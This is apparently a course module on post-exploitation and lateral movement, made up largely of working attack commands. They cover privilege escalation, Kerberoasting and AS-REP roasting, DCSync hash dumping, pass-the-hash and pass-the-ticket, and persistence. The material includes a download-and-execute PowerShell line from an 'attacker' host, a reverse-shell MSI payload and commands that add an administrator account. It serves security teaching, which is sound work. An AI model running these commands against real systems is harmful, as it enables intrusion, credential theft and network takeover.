---
title: "Week 10 — Post-Exploitation & Lateral Movement"
description: Master post-exploitation techniques including privilege escalation, credential harvesting, lateral movement, and persistence mechanisms.
---

# Week 10 — Post-Exploitation & Lateral Movement

<div class="week-meta" markdown>
**Course Objectives:** CO3 &nbsp;|&nbsp; **Focus:** Post-Compromise Operations &nbsp;|&nbsp; **Difficulty:** ⭐⭐⭐⭐☆
</div>

---

## Learning Objectives

- [ ] Execute privilege escalation on Windows and Linux systems
- [ ] Perform Kerberoasting and AS-REP Roasting against Active Directory
- [ ] Conduct lateral movement using PsExec, WMI, and WinRM
- [ ] Map Active Directory structure using BloodHound
- [ ] Establish persistence mechanisms and understand detection signatures

---

## 1. Post-Exploitation Framework

After initial compromise, the goal shifts from access to **objectives**:

```
Initial Foothold
      │
      ├── Situational Awareness  (where am I? who am I? what network?)
      ├── Privilege Escalation   (gain admin/root/SYSTEM/DA)
      ├── Credential Harvesting  (lateral movement fuel)
      ├── Lateral Movement       (pivot to other systems)
      ├── Persistence            (survive reboots / detection)
      └── Objectives             (data exfiltration, ransomware, sabotage)
```

---

## 2. Situational Awareness

```cmd
# Windows — Initial Enumeration
whoami /all              # User + groups + privileges
net user                 # Local users
net localgroup administrators  # Local admin group
ipconfig /all            # Network configuration
route print              # Routing table
netstat -ano             # Active connections + PID
tasklist /svc            # Running processes + services
systeminfo               # OS version, patches, domain
wmic product get name,version   # Installed software
net share                # Shared resources
```

```bash
# Linux — Initial Enumeration
id && whoami             # Identity
cat /etc/passwd          # All users
sudo -l                  # What can this user sudo?
uname -a                 # Kernel version
ps aux                   # Running processes
ss -tlnup                # Open ports
ip route                 # Routing table
cat /etc/crontab         # Scheduled tasks
find / -perm -4000 2>/dev/null  # SUID binaries
env                      # Environment variables (may contain credentials)
history                  # Command history (gold mine)
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## 3. Windows Privilege Escalation

### 3.1 Automated Enumeration Tools

```bash
# PowerUp (PowerSploit)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

# WinPEAS
./winPEASx64.exe

# Seatbelt (focused security checks)
.\Seatbelt.exe -group=all
```

### 3.2 Common Privilege Escalation Paths

**Unquoted Service Paths:**
```cmd
# Service path: C:\Program Files\Vulnerable Service\binary.exe
# Windows searches: C:\Program.exe → C:\Program Files\Vulnerable.exe → ...
# Place C:\Program.exe → runs as SYSTEM when service restarts

wmic service get name,displayname,pathname,startmode | findstr /iv "c:\windows\\" | findstr /iv """
```

**Weak Service Permissions:**
```cmd
# Check if we can modify service binary path
accesschk.exe -ucqv * /accepteula  # List services with weak permissions
sc config VulnSvc binpath="cmd.exe /c net localgroup administrators user /add"
sc start VulnSvc
```

**AlwaysInstallElevated:**
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → MSI packages run as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

**Token Impersonation (Potato Attacks):**
```bash
# Requires SeImpersonatePrivilege (common for service accounts: www-data, iis, sql)
# JuicyPotato (Windows Server 2019 and below)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net localgroup administrators user /add" -t *

# PrintSpoofer (Windows Server 2019+)
.\PrintSpoofer.exe -i -c "powershell -ep bypass"

# GodPotato (universal)
.\GodPotato.exe -cmd "cmd.exe /c net localgroup administrators user /add"
```

---

## 4. Active Directory Attacks

### 4.1 BloodHound — AD Attack Path Mapping

BloodHound ingests AD data and visualizes attack paths to Domain Admin:

```bash
# Collect AD data with SharpHound (on Windows domain-joined machine)
.\SharpHound.exe -c All --outputdirectory C:\temp\

# Or use bloodhound-python (from attacker Linux box)
bloodhound-python -u user -p 'Password' -d company.com -dc dc01.company.com -c All

# Import ZIP file into BloodHound UI
# Launch BloodHound, connect to Neo4j, drag-and-drop ZIP

# Key BloodHound queries:
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Users with most Local Admin Rights"
# "Kerberoastable Users"
# "AS-REP Roastable Users"
```

### 4.2 Kerberoasting

Service accounts with SPNs have tickets that can be requested and cracked offline:

```bash
# Theory:
# 1. Any domain user can request Kerberos TGS for any SPN
# 2. TGS is encrypted with the service account's NTLM hash
# 3. Ticket can be extracted and cracked offline

# Step 1: Find Kerberoastable accounts
impacket-GetUserSPNs company.com/user:password -dc-ip 192.168.1.10 -request

# Step 2: Crack the ticket
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# Windows (PowerView)
Import-Module PowerView.ps1
Get-DomainUser -SPN
Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash
```

### 4.3 AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" don't require auth before ticket issuance:

```bash
# Find AS-REP roastable users (no preauthentication required)
impacket-GetNPUsers company.com/ -usersfile users.txt -dc-ip 192.168.1.10

# Crack the AS-REP hash
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### 4.4 DCSync — Extracting All Domain Hashes

With **Replicating Directory Changes** permissions (or DA), simulate DC replication to extract all NTLM hashes:

```bash
# Mimikatz DCSync (requires DA or replication rights)
lsadump::dcsync /domain:company.com /all /csv

# Impacket secretsdump (remote)
impacket-secretsdump company.com/administrator:'Password'@192.168.1.10

# Extracted format:
# Administrator:500:aad3b435...lmhash...:31d6cfe0...ntlmhash...:
```

---

## 5. Lateral Movement

### 5.1 PsExec

```bash
# Executes commands on remote systems using SMB + named pipes
impacket-psexec administrator:'Password'@192.168.1.100

# With pass-the-hash
impacket-psexec administrator@192.168.1.100 -hashes :NTLM_HASH

# Requires: SMB port 445 open, admin share accessible, local admin on target
```

### 5.2 WMI (Windows Management Instrumentation)

```bash
# Execute command via WMI (stealthy — no service created)
impacket-wmiexec administrator:'Password'@192.168.1.100

# PowerShell WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName 192.168.1.100
```

### 5.3 WinRM / Evil-WinRM

```bash
# WinRM (Windows Remote Management) — port 5985/5986
evil-winrm -i 192.168.1.100 -u administrator -p 'Password'
evil-winrm -i 192.168.1.100 -u administrator -H 'NTLM_HASH'

# Built-in PowerShell remoting
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)
```

### 5.4 Pass-the-Ticket (Kerberos)

```bash
# Extract Kerberos tickets from memory
sekurlsa::tickets /export   # Mimikatz

# Import ticket (overpass-the-hash)
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:base64_ticket
```

---

## 6. Persistence Mechanisms

| Mechanism | Technique | Detection |
|-----------|-----------|-----------|
| **Registry Run Key** | HKCU\Software\Microsoft\Windows\CurrentVersion\Run | Registry monitoring |
| **Scheduled Task** | schtasks /create | Task Scheduler log (Event 4698) |
| **Service** | sc create | Service creation (Event 7045) |
| **WMI Subscription** | WMI event subscription | WMI activity logs |
| **Startup Folder** | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | File system monitoring |
| **DLL Hijacking** | Place malicious DLL in search path | DLL load events |
| **Golden Ticket** | Forge Kerberos TGT with stolen krbtgt hash | Long-lived TGTs, unusual auth |
| **Crontab (Linux)** | Add entry to /etc/crontab | Cron log monitoring |

---

## Key Vocabulary

| Term | Definition |
|------|------------|
| **Kerberoasting** | Request TGS for SPN → crack service account hash offline |
| **AS-REP Roasting** | Get AS-REP without auth → crack hash for no-preauth accounts |
| **DCSync** | Simulate DC replication to extract all domain hashes |
| **BloodHound** | AD attack path visualization tool using graph theory |
| **Pass-the-Hash** | Authenticate with NTLM hash directly |
| **Pass-the-Ticket** | Authenticate with stolen Kerberos ticket |
| **Golden Ticket** | Forged TGT using krbtgt hash — nearly undetectable |
| **Lateral Movement** | Moving from one compromised host to others on the network |

---

## Review Questions

!!! question "Self-Assessment"
    1. You have a Meterpreter shell as `iis_service` on a web server. This account has SeImpersonatePrivilege. Describe your complete privilege escalation path.
    2. Explain how Kerberoasting works, why it's difficult to detect, and what configuration change prevents it.
    3. A BloodHound query shows: `jsmith → AdminTo → FILESERVER01 → HasSession → DA_Account`. Interpret this path and describe how to exploit it.
    4. Compare PsExec and WMI lateral movement techniques. Which is stealthier? Why?
    5. You obtain the `krbtgt` hash. What attack does this enable, and why is it considered the "keys to the kingdom"?

---

## Further Reading

- 📄 [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- 📄 [MITRE ATT&CK: Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- 📄 [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- 📖 *The Hacker Playbook 3* — Peter Kim, Chapters 5–7
- 📄 [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)

---

*[← Week 9](week09.md) &nbsp;|&nbsp; [Course Index](index.md) &nbsp;|&nbsp; [Week 11 →](week11.md)*
